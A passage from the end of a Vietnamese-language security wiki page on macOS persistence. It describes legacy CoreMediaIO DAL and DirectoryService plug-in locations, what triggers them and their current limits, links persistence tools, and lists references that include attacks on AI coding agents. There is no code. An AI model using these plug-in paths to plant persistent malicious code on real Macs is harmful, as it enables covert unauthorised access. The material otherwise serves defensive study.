Bài viết: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Ví dụ tối giản: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Cơ chế cũ:** Không còn được hỗ trợ kể từ macOS 12.3. macOS 14.1 trở lên mặc định vô hiệu hóa các video plug-in cũ. Người dùng phải khôi phục hỗ trợ video cũ từ Recovery thì cách này mới hoạt động; chỉ cần thư mục có thể ghi là chưa đủ. [Hướng dẫn hỗ trợ hiện tại của Apple](https://support.apple.com/en-us/108387).
- Cần root để ghi vào thư mục plug-in. Việc thực thi mã phụ thuộc vào một ứng dụng tương thích vẫn tải DAL plug-in; chưa kiểm tra lúc chạy trên macOS 26.

#### Vị trí

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Cần root
  - **Kích hoạt:** Một ứng dụng camera tương thích liệt kê thiết bị **sau khi đã khôi phục hỗ trợ cũ**. Cơ chế xác thực thư viện của ứng dụng có thể chặn plug-in bên thứ ba.

#### Mô tả & Khai thác

Một số ứng dụng camera tải plug-in **DAL** (Device Abstraction Layer) của CoreMediaIO vào tiến trình. Bài [trình bày về camera-extension](https://developer.apple.com/videos/play/wwdc2022/10022/) của Apple nêu rõ các DAL plug-in cũ **không** hoạt động với FaceTime, QuickTime Player hoặc Photo Booth, và nhiều ứng dụng khác áp dụng cơ chế xác thực thư viện. Các [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) hiện đại chạy ngoài tiến trình, với mô hình cài đặt và phê duyệt riêng. Kỹ thuật chạy trong tiến trình trước đây không đồng nghĩa với việc có thể vượt qua Camera TCC nói chung trên macOS hiện tại.<sup>[[53]](#references)[[54]](#references)</sup>

Quan sát chỉ đọc trên macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` tồn tại và thuộc sở hữu của root. Chưa xác minh việc bật hỗ trợ cũ hoặc tải plug-in trong bất kỳ ứng dụng nào.

### Directory Service Plugins

Bài viết: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Cơ chế cũ, có điều kiện:** Cần root để cài đặt và cần plug-in được cấu hình cũng như tải thực sự. API plug-in của DirectoryService đã lỗi thời; hãy kiểm tra cấu hình Open Directory trên máy Mac mục tiêu trước khi xem đây là cơ chế kích hoạt lúc khởi động.

#### Vị trí

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Cần root
  - **Kích hoạt:** `dspluginhelperd` tải một plug-in đủ điều kiện đã được cấu hình khi Open Directory cần đến. [Hướng dẫn runtime plug-in của Apple](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) cho biết các plug-in không được cấu hình để khởi động có thể được tải theo nhu cầu khi node của chúng được mở.

#### Mô tả & Khai thác

`dspluginhelperd` hỗ trợ các bundle plug-in DirectoryService cũ. Plug-in độc hại có thể tạo đường dẫn thực thi với quyền cao nếu plug-in cũ được chấp nhận và kích hoạt; đây là cơ chế khác với PAM và Authorization Plugins. Việc thư mục tồn tại không chứng minh rằng plug-in mới được ghi vào đó sẽ chạy ở lần khởi động kế tiếp. Các trang hướng dẫn cục bộ `dspluginhelperd(8)` và `opendirectoryd(8)` của Apple trên macOS 26.5 vẫn liệt kê helper này và đường dẫn cũ đó.<sup>[[53]](#references)</sup>

Quan sát chỉ đọc trên macOS 26: `/Library/DirectoryServices/PlugIns` và `/usr/libexec/dspluginhelperd` tồn tại. Không có plug-in nào được cài đặt, cấu hình hoặc tải trong quá trình kiểm tra này.

## Các kỹ thuật và công cụ duy trì quyền truy cập

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, năm của Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Vượt ra ngoài LaunchAgents quen thuộc - 1 - tệp khởi động shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Vượt ra ngoài LaunchAgents quen thuộc - 18 - X11 và XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Vượt ra ngoài LaunchAgents quen thuộc - 21 - ứng dụng được mở lại](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Vượt ra ngoài LaunchAgents quen thuộc - 20 - tùy chọn Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Vượt ra ngoài LaunchAgents quen thuộc - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Vượt ra ngoài LaunchAgents quen thuộc - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Vượt ra ngoài LaunchAgents quen thuộc - 22 - LoginHook và LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Vượt ra ngoài LaunchAgents quen thuộc - 4 - tác vụ cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Vượt ra ngoài LaunchAgents quen thuộc - 2 - khởi động iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Vượt ra ngoài LaunchAgents quen thuộc - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Vượt ra ngoài LaunchAgents quen thuộc - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Vượt ra ngoài LaunchAgents quen thuộc - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Vượt ra ngoài LaunchAgents quen thuộc - 3 - mục đăng nhập](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Vượt ra ngoài LaunchAgents quen thuộc - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Vượt ra ngoài LaunchAgents quen thuộc - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Folder Actions để duy trì quyền truy cập trên macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Vượt ra ngoài LaunchAgents quen thuộc - 27 - lối tắt Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Vượt ra ngoài LaunchAgents quen thuộc - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Vượt ra ngoài LaunchAgents quen thuộc - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Phân tích cơ chế duy trì quyền truy cập của "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Vượt ra ngoài LaunchAgents quen thuộc - 16 - trình bảo vệ màn hình](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Giữ quyền truy cập: trình bảo vệ màn hình để duy trì quyền truy cập trên macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Vượt ra ngoài LaunchAgents quen thuộc - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Vượt ra ngoài LaunchAgents quen thuộc - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Vượt ra ngoài LaunchAgents quen thuộc - 19 - tập lệnh định kỳ](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Vượt ra ngoài LaunchAgents quen thuộc - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Vượt ra ngoài LaunchAgents quen thuộc - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Đánh cắp thông tin xác thực dai dẳng bằng Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Vượt ra ngoài LaunchAgents quen thuộc - 30 - tệp cấu hình man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Vượt ra ngoài LaunchAgents quen thuộc - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Vượt ra ngoài LaunchAgents quen thuộc - 31 - khung kiểm tra BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Vượt ra ngoài LaunchAgents quen thuộc - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Vượt ra ngoài LaunchAgents quen thuộc - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Vượt ra ngoài LaunchAgents quen thuộc - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Vượt ra ngoài LaunchAgents quen thuộc - 10 - tệp script ứng dụng](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Vượt ra ngoài LaunchAgents quen thuộc - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Vượt ra ngoài LaunchAgents quen thuộc - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Vượt ra ngoài LaunchAgents quen thuộc - 34 - tác vụ khởi động launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Vượt ra ngoài LaunchAgents quen thuộc - 35 - duy trì quyền truy cập qua NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Dùng email để duy trì quyền truy cập trên OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Sửa đổi plist quy tắc Apple Mail đáng ngờ (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Profile độc hại - một trong những mối đe dọa nghiêm trọng nhất đối với máy Mac (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [Nghệ thuật về malware trên Mac, tập 1 - Ch.0x2 Duy trì quyền truy cập (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Phân tích CVE-2024-44243, lỗ hổng vượt qua SIP của macOS thông qua kernel extension (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE và đánh cắp API Token thông qua tệp dự án Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Lỗ hổng mới trong GitHub Copilot và Cursor - cửa hậu trong tệp Rules (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - phương thức cài đặt thay thế (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Gỡ bỏ ExtensionInstallForcelist trong Chrome trên Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Về việc viết Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Khai thác Mac từ xa qua URL Scheme tùy chỉnh (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Hai thủ thuật duy trì quyền truy cập trên macOS bằng cách lạm dụng plugin (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Ví dụ tối giản về CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Phân tích lỗ hổng TCC của macOS dựa trên Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Tài liệu Python về module `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Từ Spotlight đến Apple Intelligence — Lạm dụng 0day để đánh cắp dữ liệu nuôi dưỡng AI trên macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../banners/hacktricks-training.md}}
